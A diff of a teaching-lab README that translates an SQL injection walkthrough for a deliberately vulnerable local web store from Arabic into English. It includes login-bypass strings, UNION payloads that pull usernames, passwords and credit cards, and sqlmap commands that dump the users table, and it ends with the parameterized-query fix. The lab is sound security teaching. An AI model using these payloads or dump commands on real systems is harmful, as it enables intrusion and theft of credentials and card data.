@@ -1,24 +1,23 @@
 # Week 5 — SQL Injection Lab (PixelCart mobile store)
 
-> ⚠️ **تحذير / Warning**
-> الـ app دي فيها ثغرات **متعمدة** لأغراض تعليمية بس.
-> شغّلها على `localhost` بس، وماتنشرهاش على أي سيرفر عام.
-> This application is **intentionally vulnerable**. Use on `localhost` only, never deploy it.
+> ⚠️ **Warning**
+> This app is **intentionally vulnerable** for teaching purposes only.
+> Run it on `localhost` only. Never deploy it to a public server.
 
-الهدف من الـ section: تفهم SQL Injection من الأول، تعمل UNION-based attack بإيدك، وبعدين تعمل أتمتة بالأداة sqlmap — وفي الآخر تشوف الإصلاح الصح.
+Goal of this section: understand SQL injection from the ground up, perform a UNION-based attack by hand, then automate it with sqlmap — and finally see the correct fix.
 
 ---
 
-## 0) تشغيل الـ lab / Running the lab
+## 0) Running the lab
 
-متطلبات: Node.js 18+ (اتجرب على 23).
+Requirements: Node.js 18+ (tested on 23).
 
 ```bash
 npm install
-npm start          # VULNERABLE mode  -> http://localhost:3000
+npm start          # VULNERABLE mode -> http://localhost:3000
 ```
 
-عشان تشغّل النسخة المحمية (الإصلاح) بعدين:
+To run the fixed (secure) version later:
 
 ```bash
 # Linux / macOS
@@ -28,26 +27,26 @@ SECURE=1 node server.js
 $env:SECURE=1; node server.js
 ```
 
-الـ DB بيتبني في الذاكرة من جديد في كل مرة بتشغّل فيها، يعني لو خربت حاجة اقفل وشغّل تاني ويرجع زي الأول.
+The database is rebuilt in memory every time you start the server, so if you break something, just stop and start again to reset.
 
-### الـ endpoints اللي هنلعب عليها
+### The endpoints we'll attack
 
-| Endpoint | السياق / Context | الثغرة |
+| Endpoint | Context | Vulnerability |
 |---|---|---|
-| `GET /products?search=` | string (جوه quotes) | UNION-based, boolean, error |
-| `GET /product?id=` | numeric (من غير quotes) | UNION-based, numeric |
+| `GET /products?search=` | string (inside quotes) | UNION-based, boolean, error |
+| `GET /product?id=` | numeric (no quotes) | UNION-based, numeric |
 | `POST /login` | string | authentication bypass |
 
-كل صفحة بتطبعلك الـ SQL اللي اتنفذ فعلاً تحت، عشان تشوف الـ input بيدخل جوه الـ query إزاي.
+Every page prints the exact SQL that was executed, so you can see how the input flows into the query.
 
 ---
 
 ## 1) SQL Injection Fundamentals
 
-### الفكرة في سطر
-الـ SQL Injection بتحصل لما الـ app بتاخد input من المستخدم وتحطه **جوه نص الـ query** كنص خام (string concatenation)، من غير فصل بين «الكود» (الـ SQL) و«الداتا» (الـ input). ساعتها الـ input يقدر يغيّر معنى الـ query نفسها.
+### The idea in one line
+SQL injection happens when the app takes user input and puts it **directly into the SQL query text** as raw string (string concatenation), with no separation between the "code" (the SQL) and the "data" (the input). The input can then change the meaning of the query itself.
 
-بُص على الكود المصاب في `server.js` عند الـ login:
+Look at the vulnerable code in `server.js` at login:
 
 ```js
 const sql =
@@ -55,263 +54,261 @@ const sql =
   "WHERE username = '" + u + "' AND password = '" + p + "'";
 ```
 
-لو المستخدم كتب في خانة الـ username القيمة دي:
+If the user types this into the username field:
 
 ```
 admin'--
 ```
 
-الـ query بتبقى كده:
+The query becomes:
 
 ```sql
 SELECT id, username, is_admin FROM users WHERE username = 'admin'--' AND password = '...'
 ```
 
-- الـ `'` بتقفل الـ string بتاعة الـ username بدري.
-- الـ `--` بتبدأ comment في SQL، فكل اللي بعدها (فحص الـ password) بيتلغي.
-- النتيجة: بتدخل كـ admin من غير ما تعرف الـ password.
+- The `'` closes the username string early.
+- The `--` starts a SQL comment, so everything after it (the password check) is ignored.
+- Result: you log in as admin without knowing the password.
 
-جرّبها: افتح `/login` وحط username:
+Try it: open `/login` and set username to:
 
 ```
 admin'--
 ```
 
-وأي حاجة في الـ password. المفروض يطلعلك «Login OK».
+and any password. You should see "Login OK".
 
-### Authentication bypass بطريقة تانية (OR 1=1)
-في خانة الـ username اكتب:
+### Authentication bypass, another way (OR 1=1)
+In the username field type:
 
 ```
 ' OR '1'='1
 ```
 
-ده بيخلي شرط الـ WHERE صح دايماً، فبيرجّع أول user في الجدول (غالباً admin).
+This makes the WHERE condition always true, so it returns the first user in the table (usually admin).
 
-### أنواع الـ SQLi (خريطة سريعة)
+### Types of SQLi (quick map)
 
-- **In-band / UNION-based**: النتيجة بترجع في نفس الصفحة. ده اللي هنركز عليه النهارده.
-- **Error-based**: بتستخرج البيانات من رسائل الـ error.
-- **Boolean-based blind**: مفيش output مباشر، بتسأل الـ DB أسئلة صح/غلط وتستنتج من رد الصفحة.
-- **Time-based blind**: زي الـ boolean بس بتستنتج من إن الرد اتأخر (sleep).
+- **In-band / UNION-based**: the result comes back in the same page. This is our focus today.
+- **Error-based**: extract data from error messages.
+- **Boolean-based blind**: no direct output; you ask the DB true/false questions and infer from the page response.
+- **Time-based blind**: like boolean, but you infer from whether the response was delayed (sleep).
 
 ---
 
-## 2) UNION-based Injection — خطوة بخطوة
+## 2) UNION-based Injection — step by step
 
-فكرة الـ `UNION`: بيلزق نتيجة `SELECT` تانية تحت نتيجة الـ query الأصلية. شرطين لازم يتحققوا:
+The idea of `UNION`: it appends the result of a second `SELECT` below the result of the original query. Two conditions must hold:
 
-1. نفس **عدد الأعمدة** في الـ SELECT الأصلي والمحقون.
-2. الأنواع **متوافقة** في الأعمدة اللي هتتعرض.
+1. Same **number of columns** in the original and the injected SELECT.
+2. **Compatible types** in the columns that get displayed.
 
-هنشتغل على بحث المنتجات:
+We'll work on the product search:
 
 ```
 GET /products?search=...
 ```
 
-الـ query الأصلية بترجّع 4 أعمدة:
+The original query returns 4 columns:
 
 ```sql
 SELECT id, name, description, price FROM products WHERE name LIKE '%<search>%'
 ```
 
-### الخطوة 1 — عدّ الأعمدة بـ ORDER BY
-جرّب تزوّد الرقم لحد ما الـ query تقع:
+### Step 1 — count columns with ORDER BY
+Increase the number until the query breaks:
 
 ```
 zzz' ORDER BY 1-- 
 zzz' ORDER BY 2-- 
 zzz' ORDER BY 4-- 
-zzz' ORDER BY 5--      <-- هنا بيطلع error => الأعمدة 4
+zzz' ORDER BY 5--      <-- error here => 4 columns
 ```
 
-اكتب الـ payload في خانة البحث (من غير ما تحط الـ `search=`؛ الفورم بيعمل كده لوحده). مثال القيمة:
+Type the payload into the search box (no need to write `search=`; the form does that). Example value:
 
 ```
 zzz' ORDER BY 5-- 
 ```
 
-> ملاحظة: في آخر الـ payload في مسافة بعد الـ `--`. ده مهم في SQLite وMySQL عشان الـ comment يشتغل صح.
+> Note: there is a space after the `--` at the end of the payload. This matters in SQLite and MySQL for the comment to work correctly.
 
-### الخطوة 2 — اطلع عدد الأعمدة الصح واعرف الظاهر منها
-دلوقتي عرفنا إنهم 4. جرّب UNION بأرقام عشان تشوف أنهي أعمدة بتتعرض على الشاشة:
+### Step 2 — use the right column count and find the visible ones
+We now know it's 4 columns. Try a UNION with numbers to see which columns are shown on screen:
 
 ```
 zzz' UNION SELECT 1,2,3,4-- 
 ```
 
-هتلاقي صف فيه 1,2,3,4 ظهر في الجدول => الأعمدة الأربعة كلها بتتعرض.
+You'll see a row with 1,2,3,4 in the results => all four columns are displayed.
 
-### الخطوة 3 — استخرج البيانات الحساسة
-دلوقتي بدّل الأرقام بأسماء أعمدة حقيقية من جدول الـ users:
+### Step 3 — extract the sensitive data
+Now replace the numbers with real column names from the users table:
 
 ```
 zzz' UNION SELECT id, username, password, is_admin FROM users-- 
 ```
 
-المفروض يطلعلك الـ usernames والـ passwords بتاعة كل المستخدمين في جدول النتايج.
+You should get the usernames and passwords of all users in the results. In this revamped UI the smuggled data shows up right inside the product cards — a realistic, visual demo.
 
-### الخطوة 4 — Database fingerprinting (SQLite)
-اعرف نسخة الـ DB:
+### Step 4 — Database fingerprinting (SQLite)
+Get the DB version:
 
 ```
 zzz' UNION SELECT 1, sqlite_version(), 3, 4-- 
 ```
 
-اعرف أسماء الجداول من الـ catalog بتاع SQLite:
+Get the table names from SQLite's catalog:
 
 ```
 zzz' UNION SELECT 1, name, sql, 4 FROM sqlite_master WHERE type='table'-- 
 ```
 
-### نفس الحكاية على السياق الرقمي /product?id=
-هنا مفيش quotes حوالين الـ id، فمش محتاج `'`:
+### Same thing on the numeric context /product?id=
+Here there are no quotes around the id, so you don't need `'`:
 
 ```
 GET /product?id=0 UNION SELECT id, username, password, credit_card FROM users-- 
 ```
 
-في المتصفح الـ URL بيتكتب كده (المسافات تبقى `%20`):
+In the browser the URL looks like this (spaces become `%20`):
 
 ```
 http://localhost:3000/product?id=0%20UNION%20SELECT%20id,username,password,credit_card%20FROM%20users--%20
 ```
 
-استخدمنا `id=0` عشان المنتج رقم 0 مش موجود، فالنتيجة الوحيدة اللي تظهر تبقى بتاعة الـ UNION بتاعتنا.
+We used `id=0` because product 0 doesn't exist, so the only result shown is our UNION's.
 
 ---
 
-## 3) الأتمتة بـ sqlmap / Automating with sqlmap
+## 3) Automating with sqlmap
 
-sqlmap أداة بتكتشف وتستغل الـ SQLi أوتوماتيك. بدل ما تعمل كل الخطوات اللي فوق بإيدك، بتديها الـ URL وهي تعمل الباقي.
+sqlmap is a tool that detects and exploits SQLi automatically. Instead of doing all the steps above by hand, you give it the URL and it does the rest.
 
-### التثبيت / Install
+### Install
 
 ```bash
-# أسهل طريقة لو عندك Python:
+# Easiest if you have Python:
 pip install sqlmap
 
-# أو من git:
+# Or from git:
 git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
 python sqlmap/sqlmap.py --version
 
-# على Kali متنصبة أصلاً: اكتب sqlmap
+# On Kali it's preinstalled: just type sqlmap
 ```
 
-> ملاحظة: شغّل الـ app الأول (`npm start`) قبل ما تجرّب أي أمر sqlmap.
+> Note: start the app first (`npm start`) before running any sqlmap command.
 
-### 3.0) الاستخدام الأساسي / Basic usage
+### 3.0) Basic usage
 
-الـ workflow الأساسي 4 خطوات بالترتيب: **كشف ← جداول ← أعمدة ← سحب**.
+The core workflow is 4 steps, in order: **detect → tables → columns → dump**.
 
-1) كشف الثغرة:
+1) Detect the vulnerability:
 
 ```bash
 sqlmap -u "http://localhost:3000/product?id=1" --batch
 ```
 
-2) اعرض الجداول:
+2) List the tables:
 
 ```bash
 sqlmap -u "http://localhost:3000/product?id=1" --batch --tables
 ```
 
-3) اعرض أعمدة جدول الـ users:
+3) List the columns of the users table:
 
 ```bash
 sqlmap -u "http://localhost:3000/product?id=1" --batch -T users --columns
 ```
 
-4) اسحب بيانات الـ users (الهدف):
+4) Dump the users data (the goal):
 
 ```bash
 sqlmap -u "http://localhost:3000/product?id=1" --batch -T users --dump
 ```
 
-أعمدة محددة بس:
+Specific columns only:
 
 ```bash
 sqlmap -u "http://localhost:3000/product?id=1" --batch -T users -C username,password --dump
 ```
 
-كل الداتا دفعة واحدة:
+All data at once:
 
 ```bash
 sqlmap -u "http://localhost:3000/product?id=1" --batch --dump-all
 ```
 
-> **مهم على SQLite:** الـ `--dbs` مبيشتغلش لأن SQLite ملهوش كذا database (الملف نفسه هو الـ DB). sqlmap هيقولك `use only '--tables'`. ده تحذير طبيعي مش فشل — استخدم `--tables` على طول.
+> **Important on SQLite:** `--dbs` does not work because SQLite has no concept of multiple databases (the file itself is the DB). sqlmap will tell you `use only '--tables'`. That's a normal warning, not a failure — use `--tables` directly.
 
-#### لو عندك طلب محفوظ من Burp (request file)
+#### If you have a saved request from Burp (request file)
 
-بدل ما تكتب الـ URL والـ parameters بإيدك، احفظ الطلب في ملف واستخدم `-r`:
+Instead of typing the URL and parameters by hand, save the request to a file and use `-r`:
 
 ```bash
 sqlmap -r ./search.req --batch --tables
 sqlmap -r ./search.req --batch -T users --dump
 ```
 
-> لو sqlmap كتب `resumed ... from stored session`، يبقى شغّال من نتيجة فحص قديمة. عشان تعيد الفحص من الأول زوّد `--flush-session`.
+> If sqlmap prints `resumed ... from stored session`, it's running from a previous scan's results. To re-run the scan from scratch, add `--flush-session`.
 
-الفلاجز الأساسية:
+Core flags:
 
-| Flag | بيعمل إيه |
+| Flag | What it does |
 |---|---|
-| `-u` | الـ target URL (فيه parameter) |
-| `-r` | يقرا الطلب من ملف محفوظ |
-| `--batch` | يجاوب بالافتراضي من غير ما يوقفك |
-| `--tables` | يعدّد الجداول |
-| `-T` | يختار جدول |
-| `-C` | يختار أعمدة معينة |
-| `--dump` | يسحب بيانات الجدول |
-| `--dump-all` | يسحب كل الجداول |
+| `-u` | target URL (with a parameter) |
+| `-r` | read the request from a saved file |
+| `--batch` | answer all prompts with defaults, non-interactive |
+| `--tables` | enumerate tables |
+| `-T` | pick a table |
+| `-C` | pick specific columns |
+| `--dump` | dump the table data |
+| `--dump-all` | dump all tables |
 
-ملاحظة: الداتا المسحوبة بتتخزن كمان في ملفات تحت:
+Note: dumped data is also saved to files under:
 
 ```
 ~/.local/share/sqlmap/output/
 ```
 
-### 3.1) كشف الثغرة في السياق الرقمي
+### 3.1) Detect on the numeric context
 
 ```bash
 sqlmap -u "http://localhost:3000/product?id=1" --batch
 ```
 
-- `-u` الـ target URL (لازم يكون فيه parameter زي `id`).
-- `--batch` خليها تجاوب على كل الأسئلة بالإجابة الافتراضية من غير ما تسألك.
+- `-u` the target URL (must contain a parameter like `id`).
+- `--batch` makes it answer all prompts with the default, without asking you.
 
-### 3.2) اعرض قواعد البيانات والجداول
+### 3.2) Show databases and tables
 
 ```bash
-sqlmap -u "http://localhost:3000/product?id=1" --batch --dbs
 sqlmap -u "http://localhost:3000/product?id=1" --batch --tables
 ```
 
-- `--dbs` يعرض قواعد البيانات الموجودة.
-- `--tables` يعرض الجداول.
+- `--tables` lists the tables (on SQLite, skip `--dbs`).
 
-### 3.3) اسحب الأعمدة وبيانات جدول الـ users
+### 3.3) Dump columns and the users table
 
 ```bash
 sqlmap -u "http://localhost:3000/product?id=1" --batch -T users --columns
 sqlmap -u "http://localhost:3000/product?id=1" --batch -T users --dump
 ```
 
-- `-T users` تحديد الجدول.
-- `--columns` يعرض أعمدة الجدول.
-- `--dump` يسحب كل بيانات الجدول (هنا هتشوف الـ passwords والكروت).
+- `-T users` select the table.
+- `--columns` list the table columns.
+- `--dump` dump all of the table's data (here you'll see the passwords and credit cards).
 
-### 3.4) على بحث المنتجات (string context)
+### 3.4) On the product search (string context)
 
 ```bash
 sqlmap -u "http://localhost:3000/products?search=Nova" -p search --batch --dump -T users
 ```
 
-- `-p search` يقوله الـ parameter اللي يهاجمه هو `search`.
+- `-p search` tells it the parameter to attack is `search`.
 
-### 3.5) على الـ login (طلب POST)
+### 3.5) On login (POST request)
 
 ```bash
 sqlmap -u "http://localhost:3000/login" \
@@ -319,22 +316,22 @@ sqlmap -u "http://localhost:3000/login" \
        -p username --batch --dump -T users
 ```
 
-- `--data` بيانات الـ POST body؛ وجودها بيخلي sqlmap يستخدم POST تلقائياً.
-- `-p username` الـ parameter اللي يختبره.
+- `--data` the POST body; its presence makes sqlmap use POST automatically.
+- `-p username` the parameter to test.
 
-### فلاجز مفيدة تانية
+### Other useful flags
 
-| Flag | بيعمل إيه |
+| Flag | What it does |
 |---|---|
-| `--current-db` | اسم قاعدة البيانات الحالية |
-| `--current-user` | مستخدم الـ DB الحالي |
-| `--level=5 --risk=3` | يزوّد شمول الفحص (payloads أكتر) |
-| `--technique=U` | يجرّب UNION بس (B/E/U/S/T/Q للباقي) |
-| `--dbms=sqlite` | يقوله نوع الـ DB عشان يسرّع |
-| `--dump-all` | يسحب كل الداتا من كل الجداول |
-| `-r request.txt` | يقرا طلب HTTP محفوظ من Burp بدل ما تكتب الـ URL |
+| `--current-db` | current database name |
+| `--current-user` | current DB user |
+| `--level=5 --risk=3` | increase scan coverage (more payloads) |
+| `--technique=U` | try UNION only (B/E/U/S/T/Q for the rest) |
+| `--dbms=sqlite` | tell it the DB type to speed things up |
+| `--dump-all` | dump all data from all tables |
+| `-r request.txt` | read a saved HTTP request from Burp instead of typing the URL |
 
-مثال مركّز لـ UNION على SQLite:
+A focused UNION example on SQLite:
 
 ```bash
 sqlmap -u "http://localhost:3000/product?id=1" --batch --dbms=sqlite --technique=U --dump -T users
@@ -342,50 +339,50 @@ sqlmap -u "http://localhost:3000/product?id=1" --batch --dbms=sqlite --technique
 
 ---
 
-## 4) الإصلاح / The Fix — Parameterized Queries
+## 4) The Fix — Parameterized Queries
 
-الحل الصح: **تفصل الكود عن الداتا** باستخدام parameterized queries (prepared statements)، فالـ input يتعامل كقيمة مش كـ SQL.
+The correct solution: **separate code from data** using parameterized queries (prepared statements), so the input is treated as a value, not as SQL.
 
-بدل الدمج بالنصوص:
+Instead of string concatenation:
 
 ```js
-// ❌ هش / vulnerable
+// ❌ vulnerable
 const sql = "SELECT * FROM users WHERE username = '" + u + "'";
 ```
 
-استخدم placeholders:
+Use placeholders:
 
 ```js
-// ✅ آمن / safe
+// ✅ safe
 const stmt = db.prepare('SELECT * FROM users WHERE username = ?');
 stmt.bind([u]);
 ```
 
-شغّل النسخة الآمنة وجرّب نفس الـ payloads اللي كسرت الـ app قبل كده:
+Run the secure version and try the same payloads that broke the app earlier:
 
 ```bash
 # Windows PowerShell
 $env:SECURE=1; node server.js
 ```
 
-- الـ `admin'--` في الـ login هيبقى username غلط فعلاً => «Invalid credentials».
-- الـ UNION في البحث هيتعامل كنص بحث عادي => «No rows returned».
+- `admin'--` in login is now literally an invalid username => "Invalid credentials".
+- The UNION in search is treated as a plain search string => "No rows returned".
 
-دروس إضافية للدفاع:
+Extra defensive lessons:
 
-- **Parameterized queries / ORM** هي خط الدفاع الأساسي.
-- **Least privilege**: حساب الـ DB بتاع الـ app ماياخدش صلاحيات أكتر من اللازم.
-- **Input validation / allow-list** للقيم المتوقعة (زي إن الـ id لازم رقم).
-- **ماتعرضش رسائل الـ error** الخام للمستخدم.
+- **Parameterized queries / ORM** are the primary line of defense.
+- **Least privilege**: the app's DB account should not have more rights than needed.
+- **Input validation / allow-list** for expected values (e.g. id must be a number).
+- **Don't expose raw error messages** to the user.
 
 ---
 
-## 5) تمارين للطلبة / Exercises
+## 5) Exercises
 
-1. استخدم UNION عشان تطلع الـ `email` بتاع الـ `admin` بس (hint: `WHERE`).
-2. اطلع كل أسماء الجداول في الـ DB باستخدام `sqlite_master`.
-3. اعمل authentication bypass بطريقة تالتة غير اللي فوق.
-4. شغّل sqlmap على الـ `/login` واسحب جدول الـ users بالكامل.
-5. شغّل الـ SECURE mode وأثبت إن كل حاجة فاتت بقت فاشلة. ليه الـ `?` فرق؟
+1. Use UNION to extract only the `admin`'s `email` (hint: `WHERE`).
+2. List all table names in the DB using `sqlite_master`.
+3. Perform an authentication bypass in a third way other than the ones above.
+4. Run sqlmap against `/login` and dump the entire users table.
+5. Run SECURE mode and prove everything above now fails. Why did the `?` make the difference?
 
-الحلول في ملف `INSTRUCTOR.md`.
+Solutions are in `INSTRUCTOR.md`.
